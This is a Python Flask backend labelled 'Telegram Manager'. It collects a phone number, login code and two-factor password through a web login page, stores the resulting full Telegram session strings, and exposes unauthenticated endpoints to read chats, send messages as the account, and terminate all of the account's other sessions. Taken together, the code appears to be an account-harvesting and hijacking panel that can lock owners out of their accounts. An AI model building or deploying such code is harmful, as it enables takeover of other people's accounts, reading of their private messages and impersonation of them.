from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError
from telethon import functions  # Add this import for terminate function
import json
import os
import asyncio
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
accounts = []
temp_sessions = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"🗑️ Removed invalid account {account_id}")
        return True
    return False

# Load accounts on startup
load_accounts()

# -------------------- PAGE ROUTES --------------------
@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')  # Fixed: renamed function to dash()

# -------------------- API ROUTES --------------------

# Get all accounts
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown')
        })
    return jsonify({'success': True, 'accounts': formatted})

# Send OTP
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Verify code
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Get chats - WITH AUTH KEY ERROR HANDLING
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Check if authorized first
            if not await client.is_user_authorized():
                return {
                    'success': False, 
                    'error': 'auth_key_unregistered',
                    'message': 'Session expired. Please re-add this account.',
                    'account_id': account_id
                }
            
            # Get all dialogs
            dialogs = await client.get_dialogs()
            logger.info(f"Found {len(dialogs)} dialogs for account {account_id}")
            
            chats = []
            
            for dialog in dialogs:
                if not dialog:
                    continue
                
                # Basic info only
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                # Simple chat object
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                
                # Add last message if exists
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {
                'success': True,
                'chats': chats,
                'messages': []
            }
            
        except AuthKeyUnregisteredError:
            logger.error(f"Auth key unregistered for account {account_id}")
            # Remove the invalid account
            remove_invalid_account(account_id)
            return {
                'success': False, 
                'error': 'auth_key_unregistered',
                'message': 'Session expired. Account has been removed. Please add it again.',
                'account_id': account_id
            }
        except errors.FloodWaitError as e:
            logger.error(f"Flood wait for account {account_id}: {e.seconds}s")
            return {
                'success': False,
                'error': 'flood_wait',
                'message': f'Too many requests. Please wait {e.seconds} seconds.',
                'wait': e.seconds
            }
        except Exception as e:
            logger.error(f"Error fetching chats for account {account_id}: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Error in get-messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {
                    'success': False, 
                    'error': 'auth_key_unregistered',
                    'message': 'Session expired. Please re-add this account.'
                }
            
            # Get entity
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except AuthKeyUnregisteredError:
            logger.error(f"Auth key unregistered for account {account_id} during send")
            remove_invalid_account(account_id)
            return {
                'success': False, 
                'error': 'auth_key_unregistered',
                'message': 'Session expired. Account has been removed.'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

# Debug endpoint
@app.route('/api/debug/chats/<int:account_id>', methods=['GET'])
def debug_chats(account_id):
    """Debug endpoint to test chat loading"""
    try:
        # Find account
        account = None
        for acc in accounts:
            if acc['id'] == account_id:
                account = acc
                break
        
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    return {
                        'success': False, 
                        'error': 'auth_key_unregistered',
                        'message': 'Session expired'
                    }
                
                dialogs = await client.get_dialogs()
                return {
                    'success': True,
                    'count': len(dialogs),
                    'names': [d.name for d in dialogs[:10] if d.name]
                }
            except AuthKeyUnregisteredError:
                remove_invalid_account(account_id)
                return {
                    'success': False, 
                    'error': 'auth_key_unregistered',
                    'message': 'Session expired and account removed'
                }
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(test())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Terminate other sessions
@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            # Get all authorized sessions
            result = await client(functions.account.GetAuthorizationsRequest())
            
            # Terminate all sessions except current one
            count = 0
            for auth in result.authorizations:
                if auth.hash != 0:  # Not current session
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        pass
            
            return {
                'success': True, 
                'message': f'Terminated {count} other sessions'
            }
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Health check
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_sessions)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('TELEGRAM MANAGER - WITH AUTH ERROR HANDLING')
    print('='*50)
    print(f'Port: {port}')
    print(f'Accounts loaded: {len(accounts)}')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port, debug=False)
